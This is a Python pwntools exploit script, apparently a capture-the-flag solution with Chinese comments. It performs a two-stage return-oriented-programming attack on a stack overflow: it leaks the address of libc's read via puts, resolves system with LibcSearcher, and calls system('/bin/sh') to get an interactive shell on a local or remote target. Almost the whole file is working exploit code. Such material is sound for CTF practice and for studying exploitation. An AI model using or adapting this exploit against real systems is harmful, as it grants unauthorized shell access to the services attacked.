#coding:utf-8
from pwn import *
from LibcSearcher import *

if len(sys.argv) == 3:
	io = remote(sys.argv[1],int(sys.argv[2]))
elif len(sys.argv) == 2:
	io = process(sys.argv[1])

readn = 0x40063D
start = 0x40068E
read_got = 0x601028
put_plt = 0x400500
put_got = 0x601018
length = 0x40
max_length = 200
bss = 0x601040

pop_rdi = 0x0000000000400763
pop_rsi_r15 = 0x0000000000400761

def stageone():
    payload = 'A'*length+"AAAAAAAA"+p64(pop_rdi)+p64(read_got) \	#pop_rdi后紧接read_got，就把read_got传入了rdi，作为参数
	+p64(put_plt)+p64(pop_rdi)+p64(bss) \	#上一行执行ret的时候就跳转到puts_plt，执行到现在就类似于执行了一个puts(read_got)
	+p64(pop_rsi_r15)+p64(7)+p64(0)+p64(readn)+p64(start)	#这一行也类似，上一行把bss的地址pop入rdi，然后把7pop入rsi，然后执行readn，就类似于执行了readn(bss，7)
    payload += "A"*(max_length-len(payload))	#这里就是填充
    io.send(payload)
    sleep(1)
    io.send("/bin/sh")		#payload送出去以后，会先puts，然后执行readn(bss,7)，所以就要再送入/bin/sh字符串
    print io.recvuntil("bye~")
    return u64(io.recv()[1:-1].ljust(8,'\0'))

read_addr = stageone()
print "read address: ", hex(read_addr)

libc = LibcSearcher("read",read_addr)
libc_base = read_addr - libc.dump("read")
system_addr = libc_base + libc.dump("system")
print "system address: ",hex(system_addr)

def stagetwo():
    payload = 'A'*length+"AAAAAAAA"+p64(pop_rdi)+p64(bss) \	#将bss的地址即/bin/sh字符串的地址传给rdi作为第一个参数，然后直接执行system，就相当于执行了system("/bin/sh")，然后getshell
	+p64(system_addr)+p64(start)
    payload += "A"*(max_length-len(payload))
    io.send(payload)

stagetwo()
io.interactive()